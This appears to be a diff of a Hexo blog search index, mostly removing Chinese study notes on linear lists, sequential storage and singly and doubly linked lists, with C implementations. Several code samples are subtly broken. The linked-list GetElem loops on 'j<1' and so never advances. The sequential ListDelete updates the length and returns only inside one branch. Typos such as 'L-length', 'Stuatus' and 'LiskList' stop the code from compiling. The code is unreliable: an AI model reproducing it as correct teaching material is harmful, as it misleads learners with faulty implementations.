+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">prior</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;    <span class="comment">//DuLNode是定义了一个双向循环链表,而*DuLinkList是定义了一个可以指向链表的指针(类型同链表)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>双向空循环</strong>链：头结点空链，rear，next两个指针都指向head</p>
+</li>
+<li><p><strong>双向非空循环</strong>链：前驱的后继（p-&gt;rear-&gt;next） &#x3D;&#x3D; 后继的前驱（p-&gt;next-&gt;rear） &#x3D;&#x3D; 自己（p）</p>
+</li>
+<li><p><span style="color: red;">插入</span>操作原则：改4个数据，注意顺序</p>
+<ol>
+<li><span style="color: purple;">&#x3D;&#x3D;先改新&#x3D;&#x3D;（待插入的结点），&#x3D;&#x3D;再改旧&#x3D;&#x3D;（原来前后结点指针域）</span></li>
+<li><span style="color: purple;">&#x3D;&#x3D;先改后&#x3D;&#x3D;（后继next），&#x3D;&#x3D;再改前&#x3D;&#x3D;（前驱rear）</span></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s-&gt;prior = p;</span><br><span class="line">s-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next-&gt;prior = s;</span><br><span class="line">p-&gt;next = s;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><span style="color: red;">删除</span>操作：改2个数据，顺序可交换</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;prior-&gt;next = p-&gt;next;    <span class="comment">//切断p前一个结点的next</span></span><br><span class="line">p-&gt;next-&gt;prior = p-&gt;prior;    <span class="comment">//切断p后一个结点的prior</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -4107,232 +4333,6 @@
       </categories>
       <tags>
         <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linear Tables</title>
-    <url>/2021/05/29/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<h1 id="线性表存储结构"><a href="#线性表存储结构" class="headerlink" title="线性表存储结构"></a>线性表存储结构</h1><ol>
-<li><h3 id="线性表（List）的定义：零-x2F-多个数据元素的有限序列"><a href="#线性表（List）的定义：零-x2F-多个数据元素的有限序列" class="headerlink" title="线性表（List）的定义：零&#x2F;多个数据元素的有限序列"></a>线性表（List）的定义：零&#x2F;多个数据元素的<span style="color: red;">有限序列</span></h3><ol>
-<li><h4 id="List主要性质："><a href="#List主要性质：" class="headerlink" title="List主要性质："></a>List主要性质：</h4><ol>
-<li>是一个有限序列</li>
-<li>元素之间是有顺序的</li>
-<li>存在&#x3D;&#x3D;直接前驱元素&#x3D;&#x3D;和&#x3D;&#x3D;直接后继元素&#x3D;&#x3D;</li>
-<li>第一个元素无前驱，最后一个元素无后继</li>
-</ol>
-</li>
-<li><h4 id="线性表长度：元素个数-n"><a href="#线性表长度：元素个数-n" class="headerlink" title="线性表长度：元素个数 n"></a>线性表长度：元素个数 <span style="color: red;">n</span></h4></li>
-<li><h4 id="空表：n-x3D-0"><a href="#空表：n-x3D-0" class="headerlink" title="空表：n&#x3D;0"></a>空表：n&#x3D;0</h4></li>
-<li><h4 id="位序：（ai）中的i"><a href="#位序：（ai）中的i" class="headerlink" title="位序：（ai）中的i"></a>位序：（a<span style="color: red;"><sub>i</sub></span>）中的<span style="color: red;">i</span></h4></li>
-</ol>
-</li>
-<li><h3 id="线性表的抽象数据类型"><a href="#线性表的抽象数据类型" class="headerlink" title="线性表的抽象数据类型"></a>线性表的抽象数据类型</h3><ol>
-<li><h4 id="传参原则：-传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式"><a href="#传参原则：-传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式" class="headerlink" title="传参原则：(传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式)"></a><span style="color: red;">传参原则</span>：(传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式)</h4><ol>
-<li>如果<strong>需要</strong>被改，&#x3D;&#x3D;传递&#x3D;&#x3D;指向这个参数的&#x3D;&#x3D;指针&#x3D;&#x3D;</li>
-<li>如果<strong>不需要</strong>被改，直接&#x3D;&#x3D;传递&#x3D;&#x3D;这个&#x3D;&#x3D;参数&#x3D;&#x3D;</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADT List</span><br><span class="line">Data</span><br><span class="line">   对象集合为&#123;a1,a2,...,an&#125;</span><br><span class="line">Operation</span><br><span class="line">   InitList(*L)</span><br><span class="line">   ListEmpty(L)</span><br><span class="line">   ClearList(*L)</span><br><span class="line">   GetElem(L,i,*e)</span><br><span class="line">   LocateElem(L,e)</span><br><span class="line">   ListInsert(*L,i,e)</span><br><span class="line">   ListDelete(*L,i,*e)</span><br><span class="line">   ListLength(L)</span><br><span class="line">   endADT</span><br></pre></td></tr></table></figure>
-</li>
-<li><h3 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构"></a>线性表的<span style="color: purple;">顺序存储结构</span></h3><ol>
-<li><h4 id="定义与性质：用一段-x3D-x3D-地址连续-x3D-x3D-的-x3D-x3D-存储单元-x3D-x3D-依次存储线表的-x3D-x3D-数据元素-x3D-x3D"><a href="#定义与性质：用一段-x3D-x3D-地址连续-x3D-x3D-的-x3D-x3D-存储单元-x3D-x3D-依次存储线表的-x3D-x3D-数据元素-x3D-x3D" class="headerlink" title="定义与性质：用一段&#x3D;&#x3D;地址连续&#x3D;&#x3D;的&#x3D;&#x3D;存储单元&#x3D;&#x3D;依次存储线表的&#x3D;&#x3D;数据元素&#x3D;&#x3D;"></a>定义与性质：用一段&#x3D;&#x3D;地址连续&#x3D;&#x3D;的&#x3D;&#x3D;存储单元&#x3D;&#x3D;<span style="color: red;">依次存储</span>线表的&#x3D;&#x3D;数据元素&#x3D;&#x3D;</h4><ol>
-<li><p>存储方式：顺序占位 O(1)</p>
-</li>
-<li><p>实现方式：一维数组</p>
-<ol>
-<li><p>估算最大存储容量，建立数组</p>
-</li>
-<li><p>（固定）数组长度&#x3D;&#x3D;最大存储容量</p>
-<pre><code><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElemType data[MAXSIZE];</span><br><span class="line">   <span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ol>
-</li>
-<li><p><span style="color: red;">顺序存储结构三属性</span>：</p>
-<blockquote>
-<p>data：数组data的存储空间初始位置就是存储空间的存储位置</p>
-</blockquote>
-<blockquote>
-<p>MAXSIZE：最大存储容量&#x2F;数组(据)长度</p>
-</blockquote>
-<blockquote>
-<p>int length：当前线性表长度</p>
-</blockquote>
-</li>
-</ol>
-</li>
-<li><h4 id="地址的计算方法：-x3D-x3D-数据元素的序号-x3D-x3D-与存放的数组-x3D-x3D-下标-x3D-x3D-存在-x3D-x3D-对应-x3D-x3D-关系"><a href="#地址的计算方法：-x3D-x3D-数据元素的序号-x3D-x3D-与存放的数组-x3D-x3D-下标-x3D-x3D-存在-x3D-x3D-对应-x3D-x3D-关系" class="headerlink" title="地址的计算方法：&#x3D;&#x3D;数据元素的序号&#x3D;&#x3D;与存放的数组&#x3D;&#x3D;下标&#x3D;&#x3D;存在&#x3D;&#x3D;对应&#x3D;&#x3D;关系"></a>地址的计算方法：&#x3D;&#x3D;数据元素的序号&#x3D;&#x3D;与存放的数组&#x3D;&#x3D;下标&#x3D;&#x3D;存在&#x3D;&#x3D;对应&#x3D;&#x3D;关系</h4></li>
-</ol>
-</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th>data[]（下标）</th>
-<th>0</th>
-<th>1</th>
-<th>…</th>
-<th>i-2</th>
-<th>i-1</th>
-<th>…</th>
-<th>n-1</th>
-<th>空闲空间</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>a<span style="color: red;"><sub>?</sub></span></td>
-<td>a<sub>1</sub></td>
-<td>a<sub>2</sub></td>
-<td>…</td>
-<td>a<sub>i-1</sub></td>
-<td>a<sub>i</sub></td>
-<td>…</td>
-<td></td>
-<td>a<sub>n</sub></td>
-</tr>
-</tbody></table>
-<ul>
-<li>C语言：数组地址从 0 开始，对应数据元素序号为 n-1<ol start="3">
-<li><h4 id="顺序存储结构的查找、插入、删除"><a href="#顺序存储结构的查找、插入、删除" class="headerlink" title="顺序存储结构的查找、插入、删除"></a>顺序存储结构的查找、插入、删除</h4></li>
-</ol>
-  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">查找获取线性表L中第i个位置（对应data[i-1]）の元素值</span></span><br><span class="line"><span class="comment">时间复杂度：O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Status;</span><br><span class="line">Status <span class="title function_">GetElem</span><span class="params">(SqList L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(L.length==<span class="number">0</span> || i&lt;<span class="number">1</span> || i&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    </span><br><span class="line">    &#125;</span><br><span class="line">    *e=L.data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">插入算法思路：</span></span><br><span class="line"><span class="comment">    1.如果插入位置不合理，抛出异常</span></span><br><span class="line"><span class="comment">    2.如果线性表长度大于等于数组长度，抛出异常或动态扩容</span></span><br><span class="line"><span class="comment">    3.最后一个元素**向前遍历**到第i个位置，分别都后移一个位置</span></span><br><span class="line"><span class="comment">    4.插入元素到i处</span></span><br><span class="line"><span class="comment">    5.length+1</span></span><br><span class="line"><span class="comment">关键点：</span></span><br><span class="line"><span class="comment">     a1.第 i 个元素 == data[i-1]</span></span><br><span class="line"><span class="comment">    a2. k 从表倒数第二位循环向前推进覆盖 k+1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length==MAXSIZE)    <span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L-&gt;length+<span class="number">1</span>)    <span class="comment">//2</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=L-length)        <span class="comment">//3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(k=L-&gt;length<span class="number">-1</span>;k&gt;=i<span class="number">-1</span>;k--)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[k+<span class="number">1</span>]=L-&gt;data[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;data[i<span class="number">-1</span>]=e;    <span class="comment">//4</span></span><br><span class="line">    L-&gt;length++;    <span class="comment">//5</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除算法思路：</span></span><br><span class="line"><span class="comment">    1.异常检测判断：删除位置不合理，抛出异常</span></span><br><span class="line"><span class="comment">    2.取出/记录删除元素</span></span><br><span class="line"><span class="comment">    3.循环覆盖实现删除：从删除元素位置开始遍历到最后一个元素位置，分别向前移动一位</span></span><br><span class="line"><span class="comment">    4.length-1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(SqList *L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length==<span class="number">0</span>)    <span class="comment">//空表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L-&gt;length)    <span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    *e=L-&gt;data[i<span class="number">-1</span>];    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(k=i;k&lt;L-&gt;length;k++)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[k<span class="number">-1</span>]=L-&gt;data[k];    <span class="comment">//3</span></span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;length--;    <span class="comment">//4</span></span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>读取时间复杂度：O(1)</li>
-<li>插入、删除时间复杂度：【平均】O(n)【最坏】O(n)【最好】O(1)</li>
-<li>顺序存储优势：<ul>
-<li>方便存、取</li>
-</ul>
-</li>
-<li>顺序存储劣势：<ul>
-<li>不方便增、删</li>
-<li>难以确定存储空间容量</li>
-<li>造成存储空间碎片</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ol start="4">
-<li><h3 id="线性表的链式存储结构"><a href="#线性表的链式存储结构" class="headerlink" title="线性表的链式存储结构"></a>线性表的<span style="color: purple;">链式存储结构</span></h3><ol>
-<li><h4 id="链式存储结构的定义：n个结点链结成一个链表"><a href="#链式存储结构的定义：n个结点链结成一个链表" class="headerlink" title="链式存储结构的定义：n个结点链结成一个链表"></a>链式存储结构的定义：n个结点链结成一个链表</h4><ol>
-<li>数据域：存储数据元素信息（data）的域</li>
-<li>指针域：<strong>存储直接后继</strong>（next）位置的域<ol>
-<li>指针&#x2F;链：指针域中存储的信息</li>
-<li>最后一节结点的指针域：NULL &#x2F; ^</li>
-</ol>
-</li>
-<li>结点：数据域+指针域&#x3D;数据元素a<sub>i</sub></li>
-<li><span style="color: green;">单链表：每个结点只包含一个指针域</span></li>
-<li>头指针：<span style="color: red;">（必要元素）</span>指向链表中第一个结点的存储位置</li>
-<li>头结点：<span style="color: red;">（非必要元素，为了方便操作）</span>人为设置，置于第一个结点前<span style="color: green;">【数据域：不存储任何信息&#x2F;存储如线表长度等附加信息】【指针域：指向第一个结点的指针】</span></li>
-</ol>
-</li>
-<li><h4 id="链式存储结构-建立单链表"><a href="#链式存储结构-建立单链表" class="headerlink" title="链式存储结构-建立单链表"></a>链式存储结构-建立单链表</h4><ol>
-<li><p>（数据域）存放数据元素：a<sub>i</sub>&#x3D;p-&gt;data，a<sub>i+1</sub>&#x3D;p-&gt;next-&gt;data</p>
-</li>
-<li><p>（指针域）存放一个指针：p-&gt;next</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;    <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span>    <span class="comment">//指针域（后继）</span></span><br><span class="line">&#125;Node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">LinkList</span>;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><h4 id="单链表的读取：“工作指针后移”遍历查找（GetElem）"><a href="#单链表的读取：“工作指针后移”遍历查找（GetElem）" class="headerlink" title="单链表的读取：“工作指针后移”遍历查找（GetElem）"></a>单链表的读取：“工作指针后移”遍历查找（GetElem）</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">遍历思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p指向链表第一个结点，初始化计数器j=1</span></span><br><span class="line"><span class="comment">    2.当j&lt;i时，遍历链表，p的指针向后移动，j++</span></span><br><span class="line"><span class="comment">    3.若链表末尾p为空，第i个结点不存在</span></span><br><span class="line"><span class="comment">    4.否则查找成功，返回数据p-&gt;data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Stuatus <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    LinkLisk p;</span><br><span class="line">    p=L-&gt;next;    <span class="comment">//1</span></span><br><span class="line">    j=<span class="number">1</span>;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;    <span class="comment">//2</span></span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j&gt;i)    <span class="comment">//3.（不为非空）!p!=0 --&gt; p==0</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    *e=p-&gt;data;    <span class="comment">//4.取出数据p-&gt;data</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><h4 id="单链表的插入、删除：O-n-【插删操作越频繁，效率优势越明显】"><a href="#单链表的插入、删除：O-n-【插删操作越频繁，效率优势越明显】" class="headerlink" title="单链表的插入、删除：O(n)【插删操作越频繁，效率优势越明显】"></a>单链表的插入、删除：O(n)【插删操作越频繁，效率优势越明显】</h4><ol>
-<li><p>插入：覆盖指针域<span style="color: red;">（先右后左）</span> <code>s-&gt;next = p-&gt;next;</code> <code>p-&gt;next = s;</code></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">插入算法思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p指向链头，初始化计数器j=1</span></span><br><span class="line"><span class="comment">    2.异常判断，指针p循环遍历到第i位，j++</span></span><br><span class="line"><span class="comment">    3.若链表末尾p为空，说明第i个结点不存在</span></span><br><span class="line"><span class="comment">    4.否则查找成功，动态扩容生成一个空节点s</span></span><br><span class="line"><span class="comment">    5.**数据元素e赋值给s-&gt;data**</span></span><br><span class="line"><span class="comment">    6.**覆盖插入指针域**</span></span><br><span class="line"><span class="comment">    7.return OK;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListInsert</span><span class="params">(LinkList *L,<span class="type">int</span> i,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    LinkList p,s;</span><br><span class="line">    p = *L;    <span class="comment">//1.指向链头</span></span><br><span class="line">    j = <span class="number">1</span>;    <span class="comment">//1.计数器</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i)    <span class="comment">//2</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j&gt;i)    <span class="comment">//3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    s=(LiskList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));    <span class="comment">//4.malloc()</span></span><br><span class="line">    s-&gt;data = e;    <span class="comment">//5</span></span><br><span class="line">    s-&gt;next = p-&gt;next;    <span class="comment">//6</span></span><br><span class="line">    p-&gt;next = s;    <span class="comment">//6</span></span><br><span class="line">    <span class="keyword">return</span> OK;    <span class="comment">//7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>删除：<span style="color: red;">后继的后继结点</span>覆盖<span style="color: red;">后继节点</span> <code>q = p-&gt;next;</code> <code>p-next = q-&gt;next; //p-&gt;next-&gt;next;</code></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除算法思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p指向表头，初始化计数器j=1</span></span><br><span class="line"><span class="comment">    2.j&lt;i，p指针循环遍历链表到i-1，j++</span></span><br><span class="line"><span class="comment">    3.异常检测：若链表末尾p为空，说明i结点不存在</span></span><br><span class="line"><span class="comment">    4.**否则查找成功，取出后继节点p-&gt;next赋值给q**</span></span><br><span class="line"><span class="comment">    5.**后继的后继q-next结点覆盖后继节点p-&gt;next**</span></span><br><span class="line"><span class="comment">    6.q结点中数据赋值给返回值e</span></span><br><span class="line"><span class="comment">    7.释放q结点【free();】</span></span><br><span class="line"><span class="comment">    8.return OK;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(LinkList *L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    LinkList p,q;</span><br><span class="line">    p = *L;    <span class="comment">//1</span></span><br><span class="line">    j = <span class="number">1</span>;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i)    <span class="comment">//2.p指针循环遍历移动到第i-1个元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next) || j&gt;i)    <span class="comment">//3.异常检测</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    q = p-&gt;next;    <span class="comment">//4</span></span><br><span class="line">    p-&gt;next = q-&gt;next;    <span class="comment">//5</span></span><br><span class="line">    *e = q-&gt;data;    <span class="comment">//6</span></span><br><span class="line">    <span class="built_in">free</span>(q);    <span class="comment">//7</span></span><br><span class="line">    <span class="keyword">return</span> OK;    <span class="comment">//8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><h4 id="单链表的整表创建：动态生成链表的过程"><a href="#单链表的整表创建：动态生成链表的过程" class="headerlink" title="单链表的整表创建：动态生成链表的过程"></a>单链表的整表创建：动态生成链表的过程</h4><ol>
-<li><p><span style="color: red;">头插法</span>创建：（在头结点后面）<strong>循环插入，向后延伸</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">头插法创建思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p和计数器j</span></span><br><span class="line"><span class="comment">    （初始化随机数发生器）</span></span><br><span class="line"><span class="comment">    2.创建一个只有头结点的单链表，L头结点指针指向NULL</span></span><br><span class="line"><span class="comment">    3.循环生成结点，接在头结点后面延伸</span></span><br><span class="line"><span class="comment">        a.生成新结点赋值给p</span></span><br><span class="line"><span class="comment">        b.随机生成数据赋值给 p的数据域-&gt;data</span></span><br><span class="line"><span class="comment">        c.单链表插入结点操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreatListHead</span><span class="params">(LinkList *L,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    *L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    (*L)-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;data=rand()%<span class="number">100</span>+<span class="number">1</span>;    <span class="comment">//1~100，rand()%100:0~99</span></span><br><span class="line">        p-&gt;next=(*L)-&gt;next;</span><br><span class="line">        (*L)-&gt;next=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><span style="color: red;">尾插法</span>创建：<strong>先来后到，延长尾巴</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">尾插法创建思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p，和指向表尾的指针r</span></span><br><span class="line"><span class="comment">    （初始化随机数发生器）</span></span><br><span class="line"><span class="comment">    2生成一个（暂时作为）尾结点</span></span><br><span class="line"><span class="comment">    3.循环生成结点，替代前一个尾结点作为新的尾结点</span></span><br><span class="line"><span class="comment">        a.生成新尾结点赋值给p，生成随机数赋值给数据域p-&gt;data</span></span><br><span class="line"><span class="comment">        b.p指针指向结点赋值给r-&gt;next：接在r后面</span></span><br><span class="line"><span class="comment">        c.p赋值给r，r指针更新尾结点</span></span><br><span class="line"><span class="comment">    4.生成结点结束，最终确定尾结点，指针域r-&gt;next赋空</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreatListTail</span><span class="params">(LinkList *L,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList p,r;    <span class="comment">//1</span></span><br><span class="line">    <span class="type">int</span> i;    </span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    *L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));    </span><br><span class="line">    r=*L;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n ; i++)    <span class="comment">//3</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));    <span class="comment">//3.a</span></span><br><span class="line">        p-&gt;data=rand()%<span class="number">100</span>+<span class="number">1</span>;    <span class="comment">//3.a</span></span><br><span class="line">        r-&gt;next=p;    <span class="comment">//3.b</span></span><br><span class="line">        r=p;    <span class="comment">//3.c</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;    <span class="comment">//4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><h4 id="单链表的整表删除"><a href="#单链表的整表删除" class="headerlink" title="单链表的整表删除"></a>单链表的整表删除</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除算法思路：</span></span><br><span class="line"><span class="comment">    1.【皇帝-&gt;太子】声明指针p负责释放结点，【遗嘱】指针q负责索引下一个待释放的结点</span></span><br><span class="line"><span class="comment">    2.从第一个结点开始（头结点-&gt;next==第一个结点，赋值给p）</span></span><br><span class="line"><span class="comment">    3.循环释放操作</span></span><br><span class="line"><span class="comment">        a.先将下一个结点p-&gt;next赋值给索引指针q</span></span><br><span class="line"><span class="comment">        b.释放p结点【free()】</span></span><br><span class="line"><span class="comment">        c.q赋值给p，继续下一个循环释放</span></span><br><span class="line"><span class="comment">    4.只剩下头结点，循环释放结束</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ClearList</span><span class="params">(LinkList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList p,q;    <span class="comment">//1</span></span><br><span class="line">    p=(*L)-&gt;next;    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(p)    <span class="comment">//3.循环释放</span></span><br><span class="line">    &#123;</span><br><span class="line">        q=p-&gt;next;    <span class="comment">//3.a</span></span><br><span class="line">        <span class="built_in">free</span>(p);    <span class="comment">//3.b</span></span><br><span class="line">        p=q;    <span class="comment">//3.c</span></span><br><span class="line">    &#125;</span><br><span class="line">    (*L)-&gt;next=<span class="literal">NULL</span>;    <span class="comment">//4</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
